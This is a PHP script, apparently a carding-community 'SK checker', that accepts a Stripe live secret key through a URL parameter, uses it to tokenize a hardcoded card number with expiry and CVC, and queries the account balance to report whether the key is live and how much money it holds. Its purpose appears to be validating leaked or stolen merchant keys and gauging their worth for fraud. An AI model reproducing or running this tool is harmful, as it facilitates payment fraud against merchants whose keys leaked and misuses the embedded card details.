<?php

error_reporting(0);
header('content-type:application/json;charset=utf-8');
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");


if (isset($_GET["sk"])) {

    $sk = filter_input(INPUT_GET, 'sk', FILTER_SANITIZE_STRING);
    $php = phpversion();

    $start = 12;
    $count = 4; 
    $masked_sk = substr($sk, 0, $start) . str_repeat("*", strlen($sk) - ($start + $count)) . substr($sk, -$count);

    if (version_compare($php, '8.1.0', '<')) {
        $response = [
            'ok' => false,
            'code' => 'php version less than 8.1',
            'hint' => 'this api needs minimum version 8.1.0 of PHP',
            'dev' =>'@Cubiqqqqq' 
        ];
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    }

    elseif (empty($sk)) {
        $response = [
            'ok' => false,
            'code' => 'no sk provided',
            'hint' => 'provide any api key for check it',
            'dev' =>'@Cubiqqqqq' 
        ];
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    }
    
    elseif (!str_starts_with($sk, "sk_live_")) {
        $response = [
            'ok' => false,
            'code' => 'vaild sk not provided',
            'hint' => 'provide a vaild api key for check it',
            'dev' =>'@Cubiqqqqq' 
        ];
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    }

    elseif (strlen($sk) < 30) {
        $response = [
            'ok' => false,
            'code' => 'vaild sk not provided',
            'hint' => 'seems invaild api key provided',
            'dev' =>'@Cubiqqqqq' 
        ];
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    }

    elseif (str_starts_with($sk, "sk_test_")) {
        $response = [
            'ok' => false,
            'code' => 'test key provided',
            'hint' => 'provide a sk_live not a test key',
            'dev' =>'@Cubiqqqqq' 
        ];
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    }

    else {
        $sk = filter_input(INPUT_GET, 'sk', FILTER_SANITIZE_STRING);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'card[number]' => '5278540001668044',
            'card[exp_month]' => '10',
            'card[exp_year]' => '2024',
            'card[cvc]' => '252'
        ]));
        curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
        $headers = array('Content-Type: application/x-www-form-urlencoded');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result1 = curl_exec($ch);
        $obj1 = json_decode($result1, true);
        $id = $obj1["card"]["id"];
        $city = $obj1["card"]["address_city"];
        $country = $obj1["card"]["address_country"];
        $finger = $obj1["card"]["fingerprint"];
        $err_msg = $obj1["error"]["message"];
        $err_type = $obj1["error"]["type"];
        $docUrl = $obj1['error']['doc_url'];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
        $result2 = curl_exec($ch);
        $obj2 = json_decode($result2, true);
        $currency = $obj2["available"][0]["currency"];
        $livemodebool = $obj2["livemode"];
        $livemode = $livemodebool ? 'true' : 'false';
        $amount_av = $obj2["available"][0]["amount"];
        $amount_in = $obj2["instant_available"][0]["amount"];
        $amount_pn = $obj2["pending"][0]["amount"];

        $currencies = [
            'usd' => '🇺🇸',
            'eur' => '🇪🇺',
            'gbp' => '🇬🇧',
            'jpy' => '🇯🇵',
            'aud' => '🇦🇺',
            'cad' => '🇨🇦',
            'chf' => '🇨🇭',
            'cny' => '🇨🇳',
            'inr' => '🇮🇳',
            'brl' => '🇧🇷',
            'mxn' => '🇲🇽',
            'krw' => '🇰🇷',
            'zar' => '🇿🇦',
            'rub' => '🇷🇺',
            'sek' => '🇸🇪',
            'nzd' => '🇳🇿',
            'sgd' => '🇸🇬',
            'hkd' => '🇭🇰',
            'try' => '🇹🇷',
            'pln' => '🇵🇱',
            'thb' => '🇹🇭',
            'idr' => '🇮🇩',
            'myr' => '🇲🇾',
            'php' => '🇵🇭',
            'czk' => '🇨🇿',
            'dkk' => '🇩🇰',
            'nok' => '🇳🇴',
            'huf' => '🇭🇺',
            'ars' => '🇦🇷',
            'clp' => '🇨🇱',
            'aed' => '🇦🇪',
            'cop' => '🇨🇴',
            'egp' => '🇪🇬',
            'sgd' => '🇸🇬',
            'vef' => '🇻🇪',
            'ngn' => '🇳🇬',
            'zar' => '🇿🇦',
            'sar' => '🇸🇦',
            'qar' => '🇶🇦',
            'kwd' => '🇰🇼',
            'omr' => '🇴🇲',
            'bhd' => '🇧🇭',
            'jod' => '🇯🇴',
            'mad' => '🇲🇦',
            'tnd' => '🇹🇳',
            'dzd' => '🇩🇿',
            'pen' => '🇵🇪',
            'uyu' => '🇺🇾',
            'vnd' => '🇻🇳'
        ];
        if (array_key_exists($currency, $currencies)) {
            $currEmj = $currencies[$currency];
        } else {
            $currEmj = 'null';
        }
        
        if (str_contains($result1, 'api_key_expired')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '❌',
                'error' => [
                'code' => 'api key expired',
                'doc url' => $docUrl,
                'message' => $err_msg,
                'type' => $err_type
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif (str_contains($result1, 'Invalid API Key provided')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '❌',
                'error' => [
                'code' => 'invaild key',
                'doc url' => $docUrl,
                'message' => $err_msg,
                'type' => $err_type
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif (str_contains($result1, 'You did not provide an API key.') || str_contains($result1, 'You need to provide your API key in the Authorization header.')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '❌',
                'error' => [
                'code' => 'missing key',
                'doc url' => $docUrl,
                'message' => $err_msg,
                'type' => $err_type
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif (str_contains($result1, 'rate_limit')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '⚠️',
                'error' => [
                'code' => 'rate limit',
                'doc url' => $docUrl,
                'message' => $err_msg,
                'type' => $err_type
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif (str_contains($result1, 'testmode_charges_only') || str_contains($result1, 'test_mode_live_card')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '⚠️',
                'error' => [
                'code' => 'test mode',
                'doc url' => $docUrl,
                'message' => $err_msg,
                'type' => $err_type
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif(str_contains($result2, 'instant_available')) {
            $response = [
                'ok' => true,
                'statusEmoji' => '✅',
                'currencyEmoji' => $currEmj,
                'encrypted' => $masked_sk,
                'code' => 'live key',
                'message' => 'provided api key is live',
                'currency' => $currency,
                'balance' => [
                'live mode' => $livemode,
                'available' => [
                'amount' => $amount_av  
                ],
                'instant available' => [
                'amount' => $amount_in
                ],
                'pending' => [
                'amount' => $amount_pn
                ]
                ],
                'token' => [
                'fingerprint' => $finger
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);            
        } else {
            $response = [
                'ok' => true,
                'statusEmoji' => '✅',
                'currencyEmoji' => $currEmj,
                'encrypted' => $masked_sk,
                'code' => 'live key',
                'message' => 'provided api key is live',
                'currency' => $currency,
                'balance' => [
                'live mode' => $livemode,
                'available' => [
                'amount' => $amount_av  
                ],
                'pending' => [
                'amount' => $amount_pn
                ]
                ],
                'token' => [
                'fingerprint' => $finger
                ],
                'dev' =>'@Cubiqqqqq' 
            ];
            echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);            
        }
    }
}

?>